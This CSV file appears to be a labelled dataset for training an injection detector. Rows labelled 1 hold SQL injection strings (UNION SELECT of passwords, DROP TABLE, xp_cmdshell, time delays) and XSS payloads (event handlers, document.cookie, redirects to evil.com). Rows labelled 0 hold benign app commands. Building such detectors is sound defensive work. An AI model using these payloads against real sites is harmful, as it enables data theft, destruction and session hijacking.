text,label
<svg onload=alert(1)>,1
1' OR '1'='1' /*,1
"search=1' UNION ALL SELECT NULL,NULL--",1
username=' OR 1=1#,1
"comment=<iframe src=data:text/html,<script>alert(1)</script>>",1
"description=<iframe src=data:text/html,<script>alert(1)</script>>",1
share link to user123,0
upload image about,0
get order status services,0
search='; EXEC xp_cmdshell('dir')--,1
id=' OR '1'='1,1
username=admin'#,1
description=<svg/onload=alert(1)>,1
'; UPDATE users SET password='hacked'--,1
share link to python programming,0
sort items by electronics,0
save settings for database design,0
sort items by pdf,0
name=<svg/onload=alert(1)>,1
save settings for database design,0
delete item id contact,0
comment=<object data=javascript:alert(1)>,1
message=javascript:alert('XSS'),1
username=' OR username IS NOT NULL--,1
<svg onload=alert(1)>,1
download file database design,0
search=1' AND 1=1--,1
username=1'; WAITFOR DELAY '00:00:05'--,1
username=' OR username IS NOT NULL--,1
update profile name to laptops,0
comment=<marquee onstart=alert(1)>,1
1' or 1=1--,1
upload image web development,0
user login with username weekend,0
update profile name to admin_panel,0
sort items by json,0
upload image invoice_2024,0
'; EXEC XP_CMDSHELL('DIR')--,1
name=<select onfocus=alert(1) autofocus>,1
username='; EXEC xp_cmdshell('dir')--,1
export report services,0
update profile name to data science,0
save settings for user123,0
search=' OR 'x'='x,1
comment=javascript:alert('XSS'),1
fetch product details json,0
create new post about csv,0
export report invoice_2024,0
sort items by weekday,0
<body onload=alert('XSS')>,1
search query for products,0
load data from pdf,0
sync calendar csv,0
id=1' OR 1=1--,1
name=javascript:alert('XSS'),1
id='; DROP TABLE users--,1
update profile name to user123,0
view page number machine learning,0
<marquee onstart=alert(1)>,1
search query for evening,0
download file report_january,0
sync calendar home,0
"1' union all select null,null--",1
comment=<img src=x onerror=alert(1)>,1
sync calendar order_12345,0
description=<select onfocus=alert(1) autofocus>,1
upload image about,0
search query for json,0
upload image web development,0
delete item id mobile apps,0
' OR 1=1#,1
name=<script>window.location='http://evil.com'</script>,1
name=<input onfocus=alert(1) autofocus>,1
export report pdf,0
load data from evening,0
import contacts admin_panel,0
description=<select onfocus=alert(1) autofocus>,1
upload image morning,0
save settings for xlsx,0
'; UPDATE USERS SET PASSWORD='HACKED'--,1
filter results by user123,0
sort items by report_january,0
message=<img src='x' onerror='alert(1)'>,1
<img src='x' onerror='alert(1)'>,1
name=<svg/onload=alert(1)>,1
view page number machine learning,0
username='; UPDATE users SET password='hacked'--,1
save settings for json,0
upload image weekday,0
download file pdf,0
ADMIN' OR '1'='1,1
1' AND EXISTS(SELECT * FROM USERS)--,1
' OR SLEEP(5)--,1
description=<body onload=alert('XSS')>,1
search='; EXEC xp_cmdshell('dir')--,1
create new post about report_january,0
search books about xlsx,0
message=<svg/onload=alert(1)>,1
create new post about pdf,0
"id=1' UNION SELECT 1,2,3--",1
"1' UNION ALL SELECT NULL,NULL--",1
<object data=javascript:alert(1)>,1
create new post about python programming,0
fetch product details home,0
<img src=x:alert(1) onerror=eval(src)>,1
'; EXEC XP_CMDSHELL('DIR')--,1
edit comment text evening,0
search books about xml,0
edit comment text admin_panel,0
ADMIN' OR '1'='1,1
id=1' OR '1'='1' /*,1
'; DROP TABLE users--,1
filter results by smartphones,0
'; DROP TABLE USERS--,1
export report mobile apps,0
message=<embed src=javascript:alert(1)>,1
ADMIN'--,1
edit comment text dashboard_view,0
export report database design,0
<input onfocus=alert(1) autofocus>,1
comment=<script>alert('XSS')</script>,1
search books about xml,0
import contacts order_12345,0
username=' OR 'a'='a,1
message=<script>alert('XSS')</script>,1
1'; WAITFOR DELAY '00:00:05'--,1
'; UPDATE USERS SET PASSWORD='HACKED'--,1
save settings for smartphones,0
username='; UPDATE users SET password='hacked'--,1
message=<svg/onload=alert(1)>,1
export report services,0
import contacts web development,0
search=1'; DELETE FROM products WHERE 1=1--,1
' OR SLEEP(5)--,1
message=<script>document.cookie</script>,1
download file data science,0
<iframe src=javascript:alert('XSS')>,1
download file morning,0
name=<svg/onload=alert(1)>,1
search=1'; WAITFOR DELAY '00:00:05'--,1
name=<marquee onstart=alert(1)>,1
message=<textarea onfocus=alert(1) autofocus>,1
description=<script>document.cookie</script>,1
save settings for services,0
update profile name to laptops,0
message=<select onfocus=alert(1) autofocus>,1
name=<img src=x:alert(1) onerror=eval(src)>,1
' OR 'x'='x,1
comment=<img src='x' onerror='alert(1)'>,1
search=1' AND 1=1--,1
view page number data science,0
upload image morning,0
export report web development,0
export report json,0
' OR 1=1#,1
username=1' ORDER BY 10--,1
search books about xml,0
"1' UNION SELECT 1,2,3--",1
<script>alert('XSS')</script>,1
comment=<img src=x:alert(1) onerror=eval(src)>,1
message=<select onfocus=alert(1) autofocus>,1
"1' UNION SELECT 1,2,3--",1
get order status evening,0
description=<input onfocus=alert(1) autofocus>,1
view page number laptops,0
description=<img src=x onerror=alert(1)>,1
message=<script>alert('XSS')</script>,1
id=' OR username IS NOT NULL--,1
get order status invoice_2024,0
search books about database design,0
message=<svg><script>alert(1)</script></svg>,1
comment=<select onfocus=alert(1) autofocus>,1
view page number csv,0
<iframe src=javascript:alert('XSS')>,1
sync calendar electronics,0
message=<script>window.location='http://evil.com'</script>,1
"message=<iframe src=data:text/html,<script>alert(1)</script>>",1
share link to xml,0
download file home,0
sync calendar user123,0
"' UNION SELECT USERNAME, PASSWORD FROM USERS--",1
"message=<iframe src=data:text/html,<script>alert(1)</script>>",1
sync calendar home,0
admin' OR '1'='1,1
create new post about services,0
name=<script>window.location='http://evil.com'</script>,1
description=<body onload=alert('XSS')>,1
sync calendar database design,0
description=<img src='x' onerror='alert(1)'>,1
sort items by database design,0
upload image machine learning,0
sort items by database design,0
update profile name to machine learning,0
search=1' UNION SELECT NULL--,1
sync calendar laptops,0
name=<svg><script>alert(1)</script></svg>,1
search query for user123,0
1'; DELETE FROM products WHERE 1=1--,1
id=1'; DELETE FROM products WHERE 1=1--,1
<script>document.cookie</script>,1
' OR 'X'='X,1
download file morning,0
username='; EXEC xp_cmdshell('dir')--,1
' or 1=1#,1
save settings for contact,0
' or '1'='1,1
comment=<embed src=javascript:alert(1)>,1
comment=<object data=javascript:alert(1)>,1
"search=1' UNION SELECT 1,2,3--",1
admin'--,1
delete item id laptops,0
search=1' OR '1'='1' /*,1
save settings for mobile apps,0
filter results by about,0
delete item id weekend,0
username=' OR username IS NOT NULL--,1
"username=1' UNION SELECT 1,2,3--",1
description=<script>document.cookie</script>,1
load data from web development,0
message=<svg><script>alert(1)</script></svg>,1
description=<embed src=javascript:alert(1)>,1
sync calendar user123,0
description=<select onfocus=alert(1) autofocus>,1
'; exec xp_cmdshell('dir')--,1
name=<embed src=javascript:alert(1)>,1
1' and 1=1--,1
name=<script>window.location='http://evil.com'</script>,1
get order status report_january,0
name=<svg><script>alert(1)</script></svg>,1
sort items by machine learning,0
search=1' UNION SELECT NULL--,1
' OR USERNAME IS NOT NULL--,1
create new post about web development,0
1' order by 10--,1
1' or '1'='1' /*,1
comment=<object data=javascript:alert(1)>,1
<script>window.location='http://evil.com'</script>,1
username=1'; WAITFOR DELAY '00:00:05'--,1
id=' OR '1'='1,1
get order status invoice_2024,0
1'; WAITFOR DELAY '00:00:05'--,1
edit comment text order_12345,0
1' UNION SELECT NULL--,1
1' ORDER BY 10--,1
sync calendar order_12345,0
<script>window.location='http://evil.com'</script>,1
search query for web development,0
user login with username weekend,0
message=<svg onload=alert(1)>,1
fetch product details database design,0
id=' OR 'x'='x,1
search query for user123,0
1'; WAITFOR DELAY '00:00:05'--,1
name=<input onfocus=alert(1) autofocus>,1
user login with username report_january,0
get order status morning,0
<select onfocus=alert(1) autofocus>,1
description=<img src=x onerror=alert(1)>,1
comment=<img src='x' onerror='alert(1)'>,1
delete item id json,0
edit comment text database design,0
upload image order_12345,0
delete item id invoice_2024,0
user login with username contact,0
username=1' OR '1'='1' /*,1
id=1'; WAITFOR DELAY '00:00:05'--,1
message=<script>document.cookie</script>,1
comment=<script>alert('XSS')</script>,1
comment=<script>document.cookie</script>,1
download file xlsx,0
name=<select onfocus=alert(1) autofocus>,1
get order status machine learning,0
'; update users set password='hacked'--,1
share link to machine learning,0
name=<input onfocus=alert(1) autofocus>,1
name=<svg/onload=alert(1)>,1
ADMIN'--,1
message=<div onmouseover=alert(1)>hover</div>,1
export report database design,0
filter results by evening,0
1'; delete from products where 1=1--,1
delete item id machine learning,0
filter results by smartphones,0
' OR '1'='1,1
export report laptops,0
<img src=x onerror=alert(1)>,1
sync calendar electronics,0
id=1' AND 1=1--,1
get order status csv,0
' or username is not null--,1
username=' OR '1'='1,1
1' or 1=1--,1
export report xlsx,0
1' or 1=1--,1
search='; UPDATE users SET password='hacked'--,1
user login with username python programming,0
delete item id json,0
search query for json,0
download file user123,0
search query for json,0
description=javascript:alert('XSS'),1
get order status laptops,0
1' OR 1=1--,1
' OR '1'='1,1
update profile name to services,0
delete item id smartphones,0
load data from user123,0
upload image machine learning,0
save settings for evening,0
share link to morning,0
name=<svg><script>alert(1)</script></svg>,1
save settings for smartphones,0
search books about machine learning,0
edit comment text evening,0
username=1' UNION SELECT NULL--,1
upload image json,0
search books about mobile apps,0
' OR username IS NOT NULL--,1
update profile name to machine learning,0
sync calendar database design,0
javascript:alert('XSS'),1
description=<script>document.cookie</script>,1
delete item id order_12345,0
description=<iframe src=javascript:alert('XSS')>,1
download file weekend,0
load data from weekday,0
' AND 1=(SELECT COUNT(*) FROM USERS)--,1
username=admin' OR '1'='1,1
id=' OR username IS NOT NULL--,1
"message=<iframe src=data:text/html,<script>alert(1)</script>>",1
username=1' AND 1=1--,1
user login with username order_12345,0
delete item id smartphones,0
name=<svg/onload=alert(1)>,1
description=<select onfocus=alert(1) autofocus>,1
"username=1' UNION SELECT 1,2,3--",1
1'; WAITFOR DELAY '00:00:05'--,1
delete item id contact,0
export report json,0
view page number evening,0
name=<iframe src=javascript:alert('XSS')>,1
fetch product details user123,0
1'; DELETE FROM products WHERE 1=1--,1
search query for xlsx,0
description=<img src=x:alert(1) onerror=eval(src)>,1
search=' AND 1=(SELECT COUNT(*) FROM users)--,1
message=javascript:alert('XSS'),1
name=<script>window.location='http://evil.com'</script>,1
view page number admin_panel,0
name=<img src='x' onerror='alert(1)'>,1
save settings for services,0
fetch product details json,0
message=<script>document.cookie</script>,1
<svg><script>alert(1)</script></svg>,1
user login with username database design,0
description=<svg onload=alert(1)>,1
' OR SLEEP(5)--,1
edit comment text xlsx,0
1'; WAITFOR DELAY '00:00:05'--,1
search='; UPDATE users SET password='hacked'--,1
search=admin'#,1
export report user123,0
admin'#,1
name=<iframe src=javascript:alert('XSS')>,1
'; UPDATE USERS SET PASSWORD='HACKED'--,1
update profile name to evening,0
fetch product details pdf,0
message=<textarea onfocus=alert(1) autofocus>,1
username='; UPDATE users SET password='hacked'--,1
1'; waitfor delay '00:00:05'--,1
import contacts morning,0
search=' AND 1=(SELECT COUNT(*) FROM users)--,1
name=<svg><script>alert(1)</script></svg>,1
filter results by laptops,0
"1' UNION ALL SELECT NULL,NULL--",1
sync calendar json,0
1' and exists(select * from users)--,1
save settings for machine learning,0
<img src='x' onerror='alert(1)'>,1
id=' OR 1=1 LIMIT 1--,1
comment=<svg><script>alert(1)</script></svg>,1
download file services,0
username=1' OR 1=1--,1
'; DROP TABLE USERS--,1
username=' OR username IS NOT NULL--,1
1' AND 1=1--,1
update profile name to morning,0
id=' AND 1=(SELECT COUNT(*) FROM users)--,1
<script>document.cookie</script>,1
view page number web development,0
search=' OR 'x'='x,1
comment=<script>document.cookie</script>,1
message=<img src=x onerror=alert(1)>,1
<img src=x:alert(1) onerror=eval(src)>,1
username='; UPDATE users SET password='hacked'--,1
user login with username laptops,0
search=1' OR 1=1--,1
fetch product details smartphones,0
delete item id admin_panel,0
delete item id machine learning,0
sort items by electronics,0
"search=' UNION SELECT username, password FROM users--",1
comment=<img src='x' onerror='alert(1)'>,1
username=' OR 1=1#,1
'; UPDATE USERS SET PASSWORD='HACKED'--,1
get order status home,0
"username=1' UNION ALL SELECT NULL,NULL--",1
comment=<input onfocus=alert(1) autofocus>,1
1'; delete from products where 1=1--,1
update profile name to report_january,0
search=' AND 1=(SELECT COUNT(*) FROM users)--,1
"id=1' UNION ALL SELECT NULL,NULL--",1
share link to xml,0
1' and exists(select * from users)--,1
filter results by pdf,0
id=' OR 1=1#,1
username=1' UNION SELECT NULL--,1
comment=<script>window.location='http://evil.com'</script>,1
filter results by machine learning,0
save settings for csv,0
sort items by json,0
1' order by 10--,1
save settings for morning,0
<embed src=javascript:alert(1)>,1
id=1' AND EXISTS(SELECT * FROM users)--,1
fetch product details morning,0
edit comment text weekday,0
user login with username data science,0
edit comment text web development,0
get order status morning,0
fetch product details csv,0
<marquee onstart=alert(1)>,1
view page number machine learning,0
upload image report_january,0
get order status home,0
delete item id dashboard_view,0
comment=<iframe src=javascript:alert('XSS')>,1
"message=<iframe src=data:text/html,<script>alert(1)</script>>",1
filter results by database design,0
import contacts services,0
import contacts invoice_2024,0
upload image evening,0
"id=1' UNION SELECT 1,2,3--",1
comment=<svg onload=alert(1)>,1
export report mobile apps,0
<object data=javascript:alert(1)>,1
id=' OR username IS NOT NULL--,1
save settings for laptops,0
comment=<img src=x onerror=alert(1)>,1
delete item id data science,0
view page number dashboard_view,0
<object data=javascript:alert(1)>,1
load data from evening,0
delete item id evening,0
view page number report_january,0
description=javascript:alert('XSS'),1
user login with username electronics,0
name=<embed src=javascript:alert(1)>,1
export report database design,0
delete item id morning,0
<img src='x' onerror='alert(1)'>,1
import contacts report_january,0
filter results by smartphones,0
create new post about home,0
username=1' AND EXISTS(SELECT * FROM users)--,1
create new post about home,0
get order status user123,0
upload image xml,0
comment=<script>alert('XSS')</script>,1
<textarea onfocus=alert(1) autofocus>,1
search books about mobile apps,0
1' or 1=1--,1
id=admin'--,1
<script>alert('XSS')</script>,1
search books about invoice_2024,0
'; EXEC XP_CMDSHELL('DIR')--,1
username=1' AND EXISTS(SELECT * FROM users)--,1
name=<svg/onload=alert(1)>,1
1'; waitfor delay '00:00:05'--,1
' and 1=(select count(*) from users)--,1
description=<svg onload=alert(1)>,1
name=<div onmouseover=alert(1)>hover</div>,1
message=<select onfocus=alert(1) autofocus>,1
name=<script>window.location='http://evil.com'</script>,1
' or '1'='1,1
download file user123,0
import contacts order_12345,0
username=' AND 1=(SELECT COUNT(*) FROM users)--,1
view page number invoice_2024,0
message=<img src=x onerror=alert(1)>,1
message=<script>alert('XSS')</script>,1
search books about services,0
save settings for csv,0
"1' UNION SELECT 1,2,3--",1
1' and exists(select * from users)--,1
id=admin' OR '1'='1,1
search query for weekday,0
view page number xml,0
user login with username mobile apps,0
import contacts data science,0
comment=<input onfocus=alert(1) autofocus>,1
upload image invoice_2024,0
"name=<iframe src=data:text/html,<script>alert(1)</script>>",1
search query for admin_panel,0
message=<img src=x onerror=alert(1)>,1
update profile name to services,0
name=<script>alert('XSS')</script>,1
description=<body onload=alert('XSS')>,1
<svg/onload=alert(1)>,1
fetch product details dashboard_view,0
share link to home,0
message=<div onmouseover=alert(1)>hover</div>,1
username=' OR username IS NOT NULL--,1
' OR 1=1#,1
filter results by pdf,0
description=<embed src=javascript:alert(1)>,1
<marquee onstart=alert(1)>,1
download file python programming,0
create new post about laptops,0
import contacts web development,0
user login with username machine learning,0
message=<script>window.location='http://evil.com'</script>,1
share link to xlsx,0
message=<svg onload=alert(1)>,1
share link to weekend,0
username=' OR '1'='1,1
load data from xlsx,0
search query for pdf,0
import contacts weekday,0
sync calendar xlsx,0
filter results by machine learning,0
id=' OR 1=1 LIMIT 1--,1
name=<input onfocus=alert(1) autofocus>,1
edit comment text smartphones,0
search=' OR '1'='1,1
sync calendar admin_panel,0
"1' union select 1,2,3--",1
save settings for products,0
id='; UPDATE users SET password='hacked'--,1
search=1' OR '1'='1' /*,1
' AND 1=(SELECT COUNT(*) FROM USERS)--,1
user login with username report_january,0
<script>document.cookie</script>,1
username=' AND 1=(SELECT COUNT(*) FROM users)--,1
upload image home,0
get order status machine learning,0
1' or 1=1--,1
message=<script>window.location='http://evil.com'</script>,1
sync calendar order_12345,0
'; DROP TABLE users--,1
load data from order_12345,0
search books about products,0
search=1'; DELETE FROM products WHERE 1=1--,1
download file morning,0
search query for csv,0
create new post about smartphones,0
'; update users set password='hacked'--,1
share link to weekend,0
sync calendar weekend,0
<object data=javascript:alert(1)>,1
message=<svg/onload=alert(1)>,1
update profile name to csv,0
save settings for database design,0
search=admin' OR '1'='1,1
view page number electronics,0
share link to xml,0
description=<script>alert('XSS')</script>,1
username=admin'#,1
message=<textarea onfocus=alert(1) autofocus>,1
export report database design,0
1'; WAITFOR DELAY '00:00:05'--,1
message=<svg><script>alert(1)</script></svg>,1
comment=<svg><script>alert(1)</script></svg>,1
import contacts invoice_2024,0
description=<div onmouseover=alert(1)>hover</div>,1
filter results by pdf,0
delete item id smartphones,0
name=<body onload=alert('XSS')>,1
search query for electronics,0
name=<div onmouseover=alert(1)>hover</div>,1
search query for pdf,0
id=' OR 'x'='x,1
sync calendar weekday,0
load data from home,0
1' or 1=1--,1
message=<marquee onstart=alert(1)>,1
user login with username web development,0
<embed src=javascript:alert(1)>,1
username=' OR username IS NOT NULL--,1
comment=<script>alert('XSS')</script>,1
search books about contact,0
comment=<img src=x onerror=alert(1)>,1
share link to contact,0
name=<img src='x' onerror='alert(1)'>,1
upload image weekday,0
filter results by electronics,0
download file products,0
comment=<select onfocus=alert(1) autofocus>,1
delete item id evening,0
message=<textarea onfocus=alert(1) autofocus>,1
' or sleep(5)--,1
' OR SLEEP(5)--,1
1' OR 1=1--,1
fetch product details pdf,0
load data from mobile apps,0
comment=<textarea onfocus=alert(1) autofocus>,1
filter results by web development,0
1' OR '1'='1' /*,1
